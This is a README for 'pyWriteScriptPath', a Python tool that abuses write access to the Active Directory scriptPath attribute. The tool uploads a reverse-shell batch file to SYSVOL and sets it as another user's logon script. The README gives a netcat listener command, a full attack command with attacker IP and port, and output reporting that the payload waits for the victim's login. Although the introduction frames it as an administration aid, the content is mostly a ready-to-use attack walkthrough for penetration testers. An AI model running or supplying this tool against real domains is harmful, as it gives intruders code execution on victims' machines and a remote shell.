# 🛠️ WriteScriptPath Tool

In Active Directory, the **scriptPath** attribute specifies a logon script that runs when a user logs in. This tool helps you upload a script to the SYSVOL share and assign it to a user’s **scriptPath** attribute, enabling automated script execution on user login — useful for administration, automation, or testing.

---

##  What Is WriteScriptPath?

In Active Directory, the `scriptPath` attribute defines a logon script that runs when a user logs in. If an attacker has **Write access to this attribute** on another user account, they can abuse it to:

- Upload a malicious script to the `\\<domain>\SYSVOL\<domain>\scripts\` share
- Set that script as the target user's logon script
- Gain **code execution** when the victim logs in

---

## ⚙️ Requirements

- Python 3.x
- `ldap3` and `impacket` Python libraries
- Valid domain user credentials with **WriteScriptPath** privilege on the target user
- Access to the Domain Controller (DC)
- A listener to catch the reverse shell (e.g. `nc -lvnp 4444`)


##  Installation

```bash
https://github.com/furious-05/pyWriteScriptPath.git
cd writescriptpath-exploit
pip install -r requirements.txt
````

> **Note**: `requirements.txt` should include:
>
> ```
> ldap3
> impacket
> ```


##  Usage

```bash
python3 pyWriteScriptPath.py \
  --domain furious \
  --username jake \
  --password 'Pass1234' \
  --target john \
  --dc-ip 192.168.1.10 \
  --listener-ip 192.168.1.100 \
  --listener-port 4444
```

###  Arguments Explained

| Argument          | Description                                         |
| ----------------- | --------------------------------------------------- |
| `--domain`        | The Active Directory domain (e.g., `furious`)       |
| `--username`      | Your (attacker’s) domain username                   |
| `--password`      | The attacker's password                             |
| `--target`        | The username of the target account                  |
| `--dc-ip`         | IP address of the Domain Controller                 |
| `--listener-ip`   | Your IP (where reverse shell should connect)        |
| `--listener-port` | Port on which your listener is running (e.g., 4444) |


## ⚙️ What Happens Behind the Scenes

1.Uploads the specified script file to the SYSVOL scripts share.
 
   ```
   \\<domain>\SYSVOL\<domain>\scripts\rev.bat
   ```
2.Sets the target user’s scriptPath attribute to point to the uploaded script.

3.The script runs on the user’s next login.


##  Example

```bash
nc -lvnp 4444  # Start your listener

python3 pyWriteScriptPath.py \
  --domain furious \
  --username jake \
  --password 'Pass1234' \
  --target john \
  --dc-ip 192.168.1.10 \
  --listener-ip 192.168.1.100 \
  --listener-port 4444
```


##  Output

```
[+] Connected to LDAP
[+] Payload uploaded to SYSVOL as rev.bat
[+] scriptPath updated for user john
[+] Done. Wait for the user to log in to trigger the payload.
```


---

## 👨‍💻 Author

Munib Nawaz
Pentester & Offensive Security Researcher

---

